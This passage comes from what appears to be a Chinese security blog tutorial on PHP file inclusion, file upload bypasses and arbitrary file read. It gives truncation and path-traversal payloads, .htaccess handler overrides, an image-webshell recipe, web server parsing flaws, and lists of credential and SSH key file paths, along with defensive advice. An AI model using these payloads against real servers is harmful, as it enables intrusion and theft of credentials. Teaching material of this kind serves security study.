?file=phar://zip.zip/phpinfo    [拼接后]  ?file=phar://zip.zip/phpinfo.txt\nExample：\n(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码)）\n所以分别构造payload为：*\n?file=zip://D:\\PHPWAMP_IN3\\wwwroot\\php.zip%23phpinfo?file=phar://../../php.zip/phpinfo\n对应的结果分别为：\n\n\n4.2.3 长度截断\n利用条件：    php版本&lt;php 5.2.8原理：    Windows下目录最大长度为256字节，超出的部分会被丢弃    Linux下目录最大长度为4096字节，超出的部分会被丢弃。利用方法：    只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)\n?file=shell.php./././。。省略。。//指定的后缀的被丢弃，成功包含木马文件\n则指定的后缀.txt会在达到最大值后会被直接丢弃掉\n4.2.4 %00截断\nHP魔术引导介绍  当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。  PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的\n在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效 利用条件：    magic_quotes_gpc = Off    php版本 &lt; php 5.3.4利用方法：    直接在文件名的最后加上%00来截断指定的后缀名      ?file=shell.php%00//现阶段%00截断不常用\n4.2.5 点号截断\n原理：    windows系统 点号 长于 256，超出的部分会被丢弃；    linux系统 点号 长于 4096，超出的部分会被丢弃；示例：http://192.168.100.150/test_include/index.php?page=1.png.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................burp抓包修改即可\n4.2.6 双写绕过\n当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php&quot;，“…/”，只需\n再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。\n4.2.7 大小写混合绕过\n如果在文件包含时，服务器对我们传入的参数没有进行严格过滤，比如没没有对大小写进行过滤，我们可以使用大小写混合进行绕过。\n0x05 漏洞防护\n1、使用str_replace等方法过滤掉危险字符\n2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）\n3、php版本升级，防止%00截断\n4、对上传的文件进行重命名，防止被读取\n5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。\n6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化\n./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。\n3）一些常见的敏感信息路径：Windows系统：    c:\\boot.ini // 查看系统版本    c:\\windows\\system32\\inetsrv\\MetaBase.xml // IIS配置文件    c:\\windows\\repair\\sam // 存储Windows系统初次安装的密码    c:\\ProgramFiles\\mysql\\my.ini // MySQL配置    c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD // MySQL root密码    c:\\windows\\php.ini // php 配置信息Linux/Unix系统：    /etc/passwd // 账户信息    /etc/shadow // 账户密码文件    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置    /usr/local/app/php5/lib/php.ini // PHP相关配置    /etc/httpd/conf/httpd.conf // Apache配置文件    /etc/my.conf // mysql 配置文件","categories":["常见top漏洞"]},{"title":"浅析文件操作漏洞","url":"/2023/08/07/%E6%B5%85%E6%9E%90%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/","content":"0x01 文件上传\n先了解一下基础知识\n要深入了解文件上传，必须了解上传属性、常见文件的结构、图形处理函数等内容。\n1） 报文特点：\n观察文件上传报文的特点：\nHeader中Content-Type特征有二：\n1.multipart/form-data（form表单的enctype属性，规定为二进制数据）2.boundary字符串（作用为分隔符，以区分POST数据）\nPOST内容特征有五：\n1.Content-Disposition：form-data2. name：input表单名3.filename：文件名4.Content-Type：定义文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件；5.boundary：Content-Type的值前面加了两个---\n\n2） 常见校验规则\n 现存常用的上传校验规则无非下面几类：1.客户端javascript校验（后缀名）2.文件头content-type字段校验（image/gif）：附带参数4.后缀名黑/白名单校验：扩展名5.文件内容头校验：GIF89a6.文件内容校验：文件信息，二次渲染7.自定义正则校验\n3）一个澄清\n​\t\t文件上传和文件解析是两个过程，即使我们上传的是php文件，但解析为图片，访问php文件会显示“图片无法显示”；或者我们上传的是jpg文件，但里面混有shell脚本，若被解析为php文件也会执行；又或者上传处没法绕过检测，只能上传jpg文件，但在其他功能处存在文件包含等功能，仍可执行成功。\n还是回到安全的本质，上传是“输入”，那文件解析就是“输出”，任何漏洞挖掘都需要结合输入+输出。\n\n4)  挖掘思路\n上传漏洞挖掘思路总结起来分三步：\n1、首先尝试直接上传脚本文件进行RCE；\n2、若存在过滤，对于检测机制进行猜测，确定机制后尝试绕过；\n3、若无法绕过上传，插入脚本后寻找解析/文件包含漏洞；\n4、换其他类型文件：html、js、svg等转到挖掘其他漏洞。\n一、文件上传常见场景\n\n场景：1.客户端JavaScript检测如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。这种前端采用JS限制上传类型和大小的方式绕过思路：1.直接本地禁用JS，不让其做检测  2.抓包，修改文件后缀名类型，绕过检测限制2.服务器后端检测服务器后端检测有较多方式，普遍分为文件类型检测，文件头类型，文件扩展名名单检测，文件内容检测，接下来进行简要分析。    a.文件类型检测    此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型\t\t\t\t\t  \t(如&quot;image/gif&quot;,&quot;image/png&quot;,&quot;image/jpeg&quot;)    绕过思路：抓包将content-type改为可接受图片形式，即可绕过\tb.文件头类型检测\t上个文件类型是检测content-type,比较好伪造，这个则是使用getimagesize()函数来获取文件的MIME类型，通过文件头进行判断文件类型\t绕过思路：针对这种，上传木马恶意文件时，先使用编辑工具在数据最前面添加图片的文件头进行伪造，即可绕过    c.文件扩展名检测    这种类型有基于黑名单检测和白名单检测。通常基于黑名单是很不安全的，黑名单机制：只拦截名单中出现的扩展后缀名，其余默认放行。这就取决于名单中的扩展后缀名覆盖能力范围了，很难把所有的考虑全面，就很容易造成漏洞。黑名单绕过思路：可以从服务器的解析特性进行分析，如特殊可解析后缀php3,php7,phtml,jspx等 如特殊的解析方式陌生后缀名，带换行后缀名，双后缀名等解析差异造成的漏洞。 还可以从混淆方面出发，后缀名大小写，点绕过，空格绕过，以及上传.htaccess配置控制文件权限和::$DATA数据流的使用基于白名单相对于黑名单就安全很多了，要求只能是特定扩展名的文件才能够上传。白名单绕过思路：MIME绕过，修改文件类型为白名单可接受的类型，以及%00，0x00截断绕过，这种场景针对save_path可控。注：00截断原理其实很巧妙，利用场景是文件保存路径可控，这样一来我们上传的文件符合白名单就行，真正动手的地方在文件保存路径出，可以放上自己的webshell文件，然后在webshell文件后面添加%00,或0x00，再加一些字符，这样一来，系统在解析碰到00就会截断，后面字符就不起作用，只剩下前面的webshell文件名，就可以在url中进行访问了。%00和0x00的使用区别在于提交get请求时，是%00,会进行url自动解码动作，然后进入验证函数。0x00则是post请求直接进入验证函数。    d.文件内容检测    比较厉害的防护检测，就是针对内容做检测，这种防护能力比较强，但也不是不能绕过。自始至终，攻防都是在对抗中螺旋演进的。    这种检测防护基本都是从webshell具有的代表性敏感字符?或者危险敏感函数。绕过思路：从特殊敏感字符开始进行Fuzz测试，探测webshell中有多少必要的字符存在被替换，如果构成webshell执行的字符被替换得较多，剩下未过滤的字符的难以支撑webshell执行，可以换个角度利用系统，调用脚本语言，如&lt;script language=&#x27;php&#x27;&gt;system(&#x27;ls&#x27;);&lt;script&gt;。\te.对图片进行二次渲染\t绕过思路：借鉴二进制中钩子的思想，其实就是想在上传图片中找一块&quot;地方&quot;，存储webshell，这块&quot;地方&quot;要求在后端处理后没有被过滤掉。那就上传一个正常的文件，然后下载下来，diff一下，查看哪些位置没有被改动过，然后添加webshell进行尝试。\n二、文件上传漏洞的原理\n    文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而WEB系统没有进行检测或逻辑做的不够安全。\n    \n    文件上传功能本身没有问题，问题在于上传后如何处理及解释文件。\n    \n    一般情况下，Web应用都会允许用户上传一些文件，如头像、附件等信息，如果Web应用没有对用户上传的文件进行有效的检查过滤，那么恶意用户就会上传一句话木马等Webshell，从而达到控制Web网站的目的。\n    \n    存在文件上传功能的地方都有可能存在文件上传漏洞，比如相册、头像上传，视频、照片分享。论坛发帖和邮箱等可以上传附件的地方也是上传漏阔的高危地带，另外像文件管理器这样的功能也有可能被攻击者所利用。\n    \n    这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等\n\n三、利用方式\n1.上传WebShell文件，攻击者可通过这些网页后门执行命令并控制服务器。\n2.上传文件是钓鱼图片或者包含了脚本的图片时，图片中的脚本，在某些版本的浏览器上会被作为脚本执行，从而被利用于钓鱼或者欺诈\n3.上传病毒、木马文件，用于诱骗用户和管理员下载执行或者直接自动运行。\n4.上传文件是其他恶意脚本时，攻击者可直接执行脚本进行攻击。\n常用防御方式:\n\n1.检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )\n2.文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .\n3.文件 MIME验证 ( 比如 GIF 图片 MIME为 image/gif,CSS 文件的 MIME为 text/css 等 )\n4.图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )\n5.文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )\n6.隐藏上传路径\n7.文件内容检测 ( 避免图片中插入 webshell)\n\n四、绕过方式\n\n1.前端检测\n\n主要是通过JavaScript代码进行检测，是最简单的绕过\n\n绕过方法：\n\n删除或者禁用js：火狐–&gt;点击JS使其为灰色-&gt;成功禁用\n使用代理上传文件，brup suite；上传符合要求的文件类型，抓包修改文件类型\n\n2.后端_扩展名检测\n\n针对文件的扩展名后缀进行检测，主要通过黑白名单进行过滤检测，若不符合过滤规则则不允许上传。\n\n2.1黑名单\n\n黑名单检测：一般有个专门的blacklist文件或列举出黑名单，里面会包含常见的危险脚本文件。\n\n\n绕过方法\n\n大小写绕过： 服务端没有将后缀名转换为统一格式进行比对，导致可以上传后缀为pHp的文件，又因为Windows操作系统大小写不敏感，所以.pHp扔回被当成php文件解析。\n\n$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);//去除字符串收尾的空白字符        $file_name = deldot($file_name);//删除文件名末尾的点(这是自定义的函数)        $file_ext = strrchr($file_name, &#x27;.&#x27;);//查找&#x27;.&#x27;在字符串中最后一次出现的位置        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123; //检查第一个参数中的内容是否在第二个参数(即数组中)            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;\n\n通过源代码可见，黑名单里虽然看似过滤得很全面，但还是出现了纰漏–没有将后缀名转为小写，若后缀名为.pHP，则可以进行大小写绕过，成功上传文件。\n\n$file_ext = strtolower($file_ext); //转换为小写\n\n修改后缀名绕过：\n\n\n名单中不允许上传.asp，.php，.jsp，.exe后缀的文件\n但可上传\n—asa cer aspx\n—php php3 php4 php5 phtml pht\n—jspx jspf\n—exee\n前提是apache的httpd.conf中有如下配置代码\n\n1 | AddType application/x-httpd-php .php .phtml .phps .php5 .pht\n当我们修改文件名后，可以发现文件上传成功\n\n重写（双写）绕过\n\n\n服务端将黑名单的后缀名替换为空，但只进行一次。上传.pphphp后缀，替换一个php为空，则后缀名变为.php，成功绕过。\n\n$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#x27;上传出错！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;\n利用Windows的命名机制\n\nshell.php. shell.php空格 shell.php:1.jpg shell. php::$DATA shell.php:1.jpg\n在Windows中，后缀名后面的点和空格都会被删除掉\n\n2.2白名单\n\n原理：白名单检测:一般有个专门的 whitelist 文件，里面会包含的正常文件：\n  Jpg png GIF\n\n绕过方法\n3.后端检测_00截断\n点击进入： 【文件上传绕过】——后端检测_文件名检测00截断绕过\n原理：虽然web应用做了校验，但是由于文件上传后的路径用户可以控制，攻击者可以利用手动添加字符串标识符0X00的方式来将后面的拼接的内容进行截断，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。\n\n思路： 在C语言中，空字符有一个特殊含义，代表字符串的拼接结束。\n这里我们使用的是php语言，属于高级语言，底层靠C语言来实现的，也就是说空字符的字符串拼接结束功能在PHP中也能实现。但是我们在URL中不能直接使用空，这样会造成无法识别；我们通过查看ASCII对照表，发现ASCII对照表第一个就空字符，它对应的16进制是00，这里我们就可以用16进制的00来代替空字符，让它截断后面的内容。\n\n使用burpsuite进行抓包，因为这里是通过URL进行传递的文件上传后存储路径，所以需要对16进制的00进行URL编码，编码的结果就是%00，通过这种方式，就可以用%00截断后面的内容，让拼接的文件名不再进行生效：\n\n4.后端检测_MIME检测：\n\nMIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。\n\n常见MIME类型text/plain （纯文本）text/html （HTML文档）text/javascript （js代码）application/xhtml+xml （XHTML文档）image/gif （GIF图像）image/jpeg （JPEG图像）image/png （PNG图像）video/mpeg （MPEG动画）application/octet-stream （二进制数据）application/pdf （PDF文档）\n检测方式：  \n在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。\n\nMIME绕过原理：\n部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。\n\n5.后端检测_文件头检测漏洞\n原理： \n在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。\n\n常见文件头\nGIF：47 49 46 38 39 61\npng： 89 50 4E 47 0D 0A 1A 0A\njpg：FF D8 FF E0 00 10 4A 46 49 46\n在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。\n\n6.后端_内容检测图片马绕过\n原理: 一般文件内容验证使用getimagesize函数检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。\n\n图片马制作\n准备一张图片，这里为a.png，和一个一句话木马，通过以下命令合成一个图片马3.php：\na.php内容：\n&lt;?php phpinfo(); ?&gt;\n命令:\n1 | copy a.png /b + a.php /a 3.php  2 | /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件3 | /a:指定以ascii格式复制、合并文件用于txt等文本类文件\n\n注：这条命令的意思是：通过copy命令，把a.png图片文件，以二进制文件形式添加到a.php文件中，以ASCII文本文件形式输出为3.php文件。\n7.解析漏洞\n7.1 .htaccess文件解析漏洞\n漏洞利用前提： web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的.htaccess文件。\n\n原理： .htaccess文件(或者&quot;分布式配置文件&quot;) ,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。\n\n利用方式： 上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。\n\n.htaccess文件内容：\n.htaccess文件解析规则的增加，是可以按照组合的方式去做的，不过具体得自己多测试。\n\n&lt;FilesMatch &quot;evil.gif&quot;&gt;\nSetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行\nAddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行\n&lt;/FilesMatch&gt;\n\n7.2 Apache解析漏洞\n原理： Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.a.b的“.a”和“.b”这两种后缀是apache不能识别解析，apache就会把test.php.a.b解析成test.php。\n\n7.3 IIS6.0解析漏洞\nIIS6.0解析漏洞分两种：\n1、目录解析：\n以xx.asp命名的文件夹里的文件都将会被当成ASP文件执行。\n2、文件解析：\nxx.asp;.jpg 像这种畸形文件名在;后面的直接被忽略，也就是说当成xx.asp文件执行。\n\nIIS6.0 默认的可执行文件除了asp还包含这三种 .asa .cer .cdx。\n\n7.4 IIS7.0 | IIS7.5 | Nginx的解析漏洞\n原理：  Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。举个例子，当php遇到文件路径/1.jpg/2.txt/3.php时，若/1.jpg/2.txt/3.php不存在，则会去掉最后的/3.php，然后判断/1.jpg/2.txt是否存在，若存在，则把/1.jpg/2.txt当做文件/1.jpg/2.txt/3.php，若/1.jpg/2.txt仍不存在，则继续去掉/2.txt，以此类推。\n漏洞形式：www.xxxxx.com/UploadFiles/image/1.jpg/1.php\n另外两种解析漏洞：\nwww.xxxxx.com/UploadFiles/image/1.jpg%00.php\nwww.xxxxx.com/UploadFiles/image/1.jpg/%20\\0.php\n7.5 Nginx 漏洞\nPHP+nginx默认是以cgi的方式去运行，当用户配置不当，会导致任意文件被当作php去解析。\n利用条件:\n以FastCGl运行\ncgi.fix_pathinfo=1(全版本PHP默认为开启)\n例如如果满足上述条件，当你访问url/shell.jpg/shell.php时，shell.jpg会被当作php去执行。\n\n7.6 Nginx 文件名逻辑漏洞(CVE-2013-4547)\n影响版本:Nginx 0.8.41 ~ 1.4.3/1.5.0 ~ 1.5.7\n利用过程:\n上传一个shell.jpg文件，注意最后为空格\n访问url/shell.jpg[Ox20][Ox00].php\n(两个中括号中的数字是用Burp在Hex界面中更改)\n漏洞复现参考链接\n\n8.二次渲染漏洞\n原理：  \n在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。\n\n绕过：\n1、配合文件包含漏洞：\n将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的 那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。\n\n2、可以配合条件竞争：\n这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传\n\n如何判断图片是否进行了二次处理？\n 对比要上传图片与上传后的图片大小，使用16进制编辑器打开图片查看上传后保留了哪些数据，查看那些数据被改变。\n9.条件竞争\n$is_upload = false;$msg = null;   //判断文件上传操作if(isset($_POST[&#x27;submit&#x27;]))&#123;  //判断是否接收到这个文件    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);  //声明一个数组，数组里面有3条数据，为：&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];  //获取图片的名字    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; //获取图片的临时存储路径    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); //通过文件名截取图片后缀    $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; //构造图片的上传路径，这里暂时重构图片后缀名。    if(move_uploaded_file($temp_file, $upload_file))&#123; //这里对文件进行了转存        if(in_array($file_ext,$ext_arr))&#123; //这里使用截取到的后缀名和数组里面的后缀名进行对比             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;  //如果存在，就对文件名进行重构             rename($upload_file, $img_path);  //把上面的文件名进行重命名             $is_upload = true;        &#125;else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; //否则返回&quot;只允许上传.jpg|.png|.gif类型文件！&quot;数据。            unlink($upload_file);// 并删除这个文件        &#125;    &#125;else&#123;        $msg = &#x27;上传出错！&#x27;;    &#125;&#125;\n代码处理流程：声明一个数组，保存着允许上传的文件类型–&gt;获取文件名和文件临时存储路径–&gt;截取文件名–&gt;构造文件上传后的存储路径–&gt;对文件进行转存–&gt;比对白名单，如果存在就对文件进行重命名–&gt;否则就删除文件。\n通过上面代码我们发现：\n  服务器先通过move_uploaded_file函数把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。重点在于，在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致防护被绕过。\n  我们上传一个文件上去，后端会检验上传文件是否和要求的文件是否一致。如果不能达到要求就会删除文件，如果达成要求就会保留，那么当我们上传文件上去的时候，检测是否到达要求需要一定的时间，这个时间可长可短，但是我们确确实实在某一刻文件已经上传到了指定地址，并且访问到这个文件。这时候就会造成条件竞争。\n参考: 【文件上传绕过】——文件上传漏洞基础入门\n太厉害了，终于有人能把文件上传漏洞讲的明明白白了—这里还讲了webshell相关内容\n五、防御技巧\n1、文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。\n2、判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的，严格过滤扩展名为“.php、.asp、.bat”等可执行文件上传。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。\n3、使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。\n4、单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。\n5、使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。\n6、隐藏文件上传目录，用户上传文件的目标目录对用户隐藏。\n六、如何构造优质FUZZ字典\n\n构造优质上传漏洞Fuzz字典\n\n0x02 文件读取与下载\n文件读取常见函数:fopenfile_get_contentsfreadfgetsfgetssfilefpassthruparse_ini_filereadfile\n1. 为什么产生任意文件读取与下载漏洞\n一些网站的业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源文件，敏感文件等等。\n2. 任意文件读取漏洞\n任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。\n漏洞产生原因\n\n存在读取文件的函数\n读取文件的路径用户可控，且未校验或校验不严\n输出了文件内容\n\n任意文件读取\n&lt;?php$filename=”test.txt”;readfile($filename);?&gt;\n&lt;?php$filename=”test.txt”;echo file_get_contents($filename);?&gt;\n文件读取函数\nreadfile()、file_get_contents()、fopen()中，$filename没有经过校验或者校验不合格，用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini。\n3. 文件读取漏洞挖掘\n\n1、web漏洞扫描器（awvs、appscan、openvas、nessus）\n2、手动挖掘从连接和参数名查看\n\nGoogle search\ninurl:”readfile.php?file=inurl:”read.php?filename=inurl:”download.php?file=inurl:”down.php?file=\n连接：\nreadfile.php?file=**.txtdownload.php?file=**.rar\n参数名：\n&amp;RealPath=、&amp;readpath=、&amp;FilePath=、&amp;filepath=、&amp;Path=、&amp;path=、&amp;Inputfile=、&amp;inputfile=、&amp;url=、&amp;urls=、&amp;Lang=、&amp;dis=、&amp;Data=、&amp;data=、&amp;readfile=、&amp;ﬁlep=、&amp;Src=、&amp;src=、&amp;menu=、META-INF= 、WEB-INF\n4. 敏感信息\nWindows：\n\nC:\\boot.ini //查看系统版本\nC:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件\nC:\\Windows\\repair\\sam //存储系统初次安装的密码\nC:\\Program Files\\mysql\\my.ini //Mysql配置\nC:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root\nC:\\Windows\\php.ini //php配置信息\nC:\\Windows\\my.ini //Mysql配置信息\n\nLinux：\n\n/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去\n/root/.ssh/id_rsa  //ssh私钥,ssh公钥是id_rsa.pub\n/root/.ssh/id_ras.keystore  //记录每个访问计算机用户的公钥\n/root/.ssh/known_hosts\n//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。\n/etc/passwd  // 账户信息\n/etc/shadow  // 账户密码文件\n/etc/my.cnf  //mysql 配置文件\n/etc/httpd/conf/httpd.conf  // Apache配置文件\n/root/.bash_history     //用户历史命令记录文件\n/root/.mysql_history    //mysql历史命令记录文件\n/proc/self/fd/fd[0-9]*(文件标识符)\n/proc/mounts     //记录系统挂载设备\n/porc/config.gz   //内核配置文件\n/var/lib/mlocate/mlocate.db //全文件路径\n/porc/self/cmdline //当前进程的cmdline参数\n\n5. 绕过思路\n可以进行fuzz\n1. url编码代替.或者/，如使用%2F代替/   ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd   2. 二次编码(%25)   ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd3. 加入+   ?filename=.+./.+./bin/redacted.dll4. %00   ?filename=.%00./file.php   /etc/passwd%00.jpg5. \\   ?filename=..%5c..%5c/windows/win.ini6. Java %c0%ae 